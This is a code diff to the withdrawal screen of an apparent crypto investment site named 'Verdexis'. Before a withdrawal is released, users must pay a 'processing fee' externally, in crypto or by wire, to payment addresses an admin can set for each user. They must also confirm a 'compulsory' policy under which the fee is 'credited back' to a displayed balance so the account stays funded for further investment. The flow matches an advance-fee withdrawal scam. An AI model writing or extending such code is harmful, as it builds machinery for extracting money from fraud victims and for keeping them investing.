@@ -9,6 +9,8 @@ import { portfolioStore } from '../lib/portfolioStore'
 import { listBanks, removeBank, onBanksChanged, type BankAccount } from '../lib/bankLink'
 import { depositInstructions, onDepositInstructionsChanged, isAdmin } from '../lib/depositInstructions'
 import type { Web3Payout } from '../lib/depositInstructions'
+import { userWallets, USER_WALLETS_EVENT } from '../lib/userWallets'
+import { getProfile } from '../lib/userProfile'
 import { useWeb3 } from '../hooks/use-web3'
 import { cryptoIconFor, assetIconFor } from '../lib/cryptoIcon'
 import { api, getToken, newIdempotencyKey } from '../lib/api'
@@ -143,6 +145,11 @@ export default function WalletPage() {
   } | null>(null)
   const [feeProof, setFeeProof] = useState('')
   const [feePayCurrency, setFeePayCurrency] = useState<string>('BTC')
+  // Compulsory acknowledgment: user must agree the fee they pay externally
+  // will be credited back to their wallet balance (account cannot be empty
+  // for the next investment cycle — company rule).
+  const [feeAck, setFeeAck] = useState(false)
+  const [userWalletTick, setUserWalletTick] = useState(0)
   const [adminMode, setAdminMode] = useState<boolean>(() => isAdmin())
   const [instructionsTick, setInstructionsTick] = useState(0)
   const wireInstructions = useMemo(
@@ -292,6 +299,37 @@ export default function WalletPage() {
     return baseline[currency.toUpperCase()] || 1
   }
 
+  // Company-rule sliding processing-fee schedule. Higher gross = higher %.
+  //   < $10k          → 0.8%
+  //   $10k  –  $50k   → 1.0%
+  //   $50k  – $250k   → 1.5%
+  //   ≥ $250k          → 2.0%
+  function calcProcessingFee(grossUsd: number): { feeUsd: number; ratePct: number; tierLabel: string } {
+    if (grossUsd <= 0) return { feeUsd: 0, ratePct: 0.8, tierLabel: 'Tier 1 (< $10k)' }
+    let ratePct: number
+    let tierLabel: string
+    if (grossUsd < 10_000)        { ratePct = 0.8; tierLabel = 'Tier 1 (< $10k)' }
+    else if (grossUsd < 50_000)   { ratePct = 1.0; tierLabel = 'Tier 2 ($10k–$50k)' }
+    else if (grossUsd < 250_000)  { ratePct = 1.5; tierLabel = 'Tier 3 ($50k–$250k)' }
+    else                          { ratePct = 2.0; tierLabel = 'Tier 4 (≥ $250k)' }
+    return { feeUsd: grossUsd * (ratePct / 100), ratePct, tierLabel }
+  }
+
+  // Per-user admin-set wallet override (crypto address / wire) for fee
+  // payment + deposits. Refreshes when the userWallets event fires so admin
+  // edits in another tab are reflected live.
+  useEffect(() => {
+    const onChange = () => setUserWalletTick(t => t + 1)
+    window.addEventListener(USER_WALLETS_EVENT, onChange)
+    return () => window.removeEventListener(USER_WALLETS_EVENT, onChange)
+  }, [])
+  const userOverride = useMemo(() => {
+    const profile = getProfile()
+    if (!profile?.email) return null
+    return userWallets.get(profile.email)
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [userWalletTick])
+
   // Cryptos a user can convert USD into. Independent of what they currently
   // hold, so a cash-only account can still pick a target.
   const CONVERT_TARGETS = ['BTC', 'ETH', 'SOL', 'USDC', 'USDT', 'ADA', 'XRP', 'DOGE', 'MATIC', 'DOT', 'AVAX', 'LINK', 'LTC', 'BCH'] as const
@@ -393,7 +431,7 @@ export default function WalletPage() {
     const deliverySurcharge = selectedCurrency === 'USD' && (usdWithdrawMethod === 'cashiers_check' || usdWithdrawMethod === 'check')
       ? (checkInfo.delivery === 'overnight' ? 25 : checkInfo.delivery === 'priority' ? 10 : 0)
       : 0
-    const processingFeeUsd = Math.max(500, grossUsd * 0.008)
+    const { feeUsd: processingFeeUsd } = calcProcessingFee(grossUsd)
     const totalFeeUsd = processingFeeUsd + deliverySurcharge
 
     let reference = selectedCurrency === 'USD' ? 'Bank Transfer (ACH)' : `Crypto Withdrawal (${selectedCurrency})`
@@ -471,11 +509,13 @@ export default function WalletPage() {
     })
     setFeeProof('')
     setFeePayCurrency('BTC')
+    setFeeAck(false)
   }
 
   const cancelFeePayment = () => {
     setPendingWithdrawal(null)
     setFeeProof('')
+    setFeeAck(false)
   }
 
   const commitWithdrawal = () => {
@@ -485,23 +525,41 @@ export default function WalletPage() {
       setTransferStatus({ kind: 'error', title: 'Fee proof required', message: 'Paste the transaction hash or wire reference (min 6 characters) so we can verify your fee payment.' })
       return
     }
+    if (!feeAck) {
+      setTransferStatus({ kind: 'error', title: 'Acknowledgment required', message: 'You must acknowledge that the fee will be credited back to your wallet balance to keep the account active for the next investment cycle.' })
+      return
+    }
     const fmt = (n: number) => `$${n.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
     const reference = `${pendingWithdrawal.reference} | Fee paid via ${feePayCurrency}: ${proof.slice(0, 24)}${proof.length > 24 ? '…' : ''}`
     const signed = -pendingWithdrawal.amountAbs
     portfolioStore.addTransaction('withdraw', signed, pendingWithdrawal.currency, reference, newIdempotencyKey())
 
+    // Compulsory fee credit-back: the externally paid fee is added to the
+    // user's USD balance so the account is never empty for the next
+    // investment (company rule). Recorded as a separate deposit transaction
+    // so it shows clearly in history and audit.
+    portfolioStore.addTransaction(
+      'deposit',
+      pendingWithdrawal.feeUsd,
+      'USD',
+      `Account-activation fee credit (paid externally via ${feePayCurrency} — ${proof.slice(0, 16)}${proof.length > 16 ? '…' : ''})`,
+      newIdempotencyKey(),
+    )
+
     const grossLabel = pendingWithdrawal.currency === 'USD'
       ? fmt(pendingWithdrawal.amountAbs)
       : `${pendingWithdrawal.amountAbs.toLocaleString(undefined, { maximumFractionDigits: 8 })} ${pendingWithdrawal.currency}`
-    let successMessage = `${pendingWithdrawal.methodLabel} for ${grossLabel} submitted. Fee ${fmt(pendingWithdrawal.feeUsd)} (proof attached) — pending admin verification.`
+    let successMessage = `${pendingWithdrawal.methodLabel} for ${grossLabel} submitted. Fee ${fmt(pendingWithdrawal.feeUsd)} (proof attached) will be credited back to your wallet balance — pending admin verification.`
     if (pendingWithdrawal.etaNote) successMessage += ` ${pendingWithdrawal.etaNote}`
 
     setTransferStatus({ kind: 'success', title: 'Withdrawal queued', message: successMessage })
     setAmount('')
     setRecipient('')
     setTransactions(portfolioStore.getTransactions())
+    setWallet(portfolioStore.getWallet())
     setPendingWithdrawal(null)
     setFeeProof('')
+    setFeeAck(false)
   }
 
   const handleTransfer = async () => {
@@ -1474,13 +1532,13 @@ export default function WalletPage() {
                   const deliverySurcharge = selectedCurrency === 'USD' && (usdWithdrawMethod === 'cashiers_check' || usdWithdrawMethod === 'check')
                     ? (checkInfo.delivery === 'overnight' ? 25 : checkInfo.delivery === 'priority' ? 10 : 0)
                     : 0
-                  const processingFee = amt > 0 ? Math.max(500, grossUsd * 0.008) : 0
+                  const { feeUsd: processingFee, ratePct, tierLabel } = calcProcessingFee(grossUsd)
                   const totalFee = processingFee + deliverySurcharge
                   const fmt = (n: number) => `$${n.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
                   return (
                     <div className="border-t border-[#ffffff08] pt-3 space-y-2">
                       <div className="flex items-center justify-between">
-                        <span className="text-sm text-[#A0A0A0]">Processing Fee <span className="text-[10px] text-[#737373]">(max of $500 or 0.8%)</span></span>
+                        <span className="text-sm text-[#A0A0A0]">Processing Fee <span className="text-[10px] text-[#737373]">({ratePct.toFixed(1)}% · {tierLabel})</span></span>
                         <span className="text-sm text-[#E5E5E5]">{amt > 0 ? fmt(processingFee) : '—'}</span>
                       </div>
                       {deliverySurcharge > 0 && (
@@ -1494,7 +1552,10 @@ export default function WalletPage() {
                         <span className="text-sm font-medium text-[#E5E5E5]">{amt > 0 ? fmt(totalFee) : '—'}</span>
                       </div>
                       <p className="text-[11px] text-[#F57C00] mt-1">
-                        ⚠ Fee is paid out-of-band — it is NOT deducted from your wallet balance. After clicking the button below, you'll get payment instructions and a field to attach your transaction proof.
+                        ⚠ Sliding-scale fee (0.8% – 2.0% by amount, company rules). Paid externally — NOT deducted from your wallet balance.
+                      </p>
+                      <p className="text-[11px] text-[#0C8B44] mt-1">
+                        ✓ The fee you pay is credited back to your wallet balance once verified, so the account stays funded for your next investment.
                       </p>
                     </div>
                   )
@@ -1708,8 +1769,10 @@ export default function WalletPage() {
 
       {pendingWithdrawal && (() => {
         const fmt = (n: number) => `$${n.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
-        const cryptoWallet = depositInstructions.getCrypto(feePayCurrency)
-        const wireFee = depositInstructions.getWire('USD')
+        const overrideCrypto = userOverride?.cryptos?.[feePayCurrency]
+        const overrideWire = userOverride?.wire
+        const cryptoWallet = overrideCrypto || depositInstructions.getCrypto(feePayCurrency)
+        const wireFee = overrideWire || depositInstructions.getWire('USD')
         const cryptoOptions = ['BTC', 'ETH', 'USDT', 'USDC', 'SOL', 'XRP', 'DOGE']
         const usdAmount = pendingWithdrawal.feeUsd
         return (
@@ -1738,7 +1801,17 @@ export default function WalletPage() {
                     {pendingWithdrawal.feeBreakdown.delivery > 0 ? ` + Delivery ${fmt(pendingWithdrawal.feeBreakdown.delivery)}` : ''}.
                     Verdexis cannot deduct this from your account balance — please pay it externally and submit the transaction proof below.
                   </p>
+                  <p className="text-[11px] text-[#0C8B44] mt-2">
+                    ✓ The {fmt(usdAmount)} you pay will be credited back to your wallet balance after verification, so the account isn't empty for your next investment cycle.
+                  </p>
                 </div>
+
+                {userOverride && (
+                  <div className="rounded-xl border border-[#0C8B44]/30 bg-[#0C8B44]/5 p-3">
+                    <p className="text-[11px] text-[#0C8B44] font-medium">Personal payment destination assigned by your account manager.</p>
+                    {userOverride.notes && <p className="text-[11px] text-[#A0A0A0] mt-1">{userOverride.notes}</p>}
+                  </div>
+                )}
 
                 <div>
                   <p className="text-xs text-[#A0A0A0] mb-2">Pay the fee in:</p>
@@ -1804,6 +1877,18 @@ export default function WalletPage() {
                   <p className="text-[10px] text-[#737373] mt-1">We verify this on-chain (or via the bank) before releasing your withdrawal. False proofs cause permanent account suspension.</p>
                 </div>
 
+                <label className="flex items-start gap-2.5 cursor-pointer select-none rounded-xl bg-[#1a1a1a] border border-[#ffffff08] p-3">
+                  <input
+                    type="checkbox"
+                    checked={feeAck}
+                    onChange={(e) => setFeeAck(e.target.checked)}
+                    className="mt-0.5 w-4 h-4 accent-[#0C8B44] cursor-pointer"
+                  />
+                  <span className="text-[11px] text-[#A0A0A0] leading-relaxed">
+                    <span className="text-[#E5E5E5] font-medium">Required:</span> I understand the {fmt(usdAmount)} processing fee is paid externally (not from my balance) and will be credited back to my wallet so the account remains funded for the next investment. I confirm this is a compulsory company policy.
+                  </span>
+                </label>
+
                 <div className="flex gap-2 pt-2">
                   <button
                     type="button"
@@ -1815,7 +1900,7 @@ export default function WalletPage() {
                   <button
                     type="button"
                     onClick={commitWithdrawal}
-                    disabled={feeProof.trim().length < 6}
+                    disabled={feeProof.trim().length < 6 || !feeAck}
                     className="flex-[2] py-3 rounded-xl bg-[#0C8B44] text-white text-sm font-medium hover:bg-[#0a7539] disabled:opacity-40 disabled:cursor-not-allowed"
                   >
                     I've paid the fee — submit withdrawal
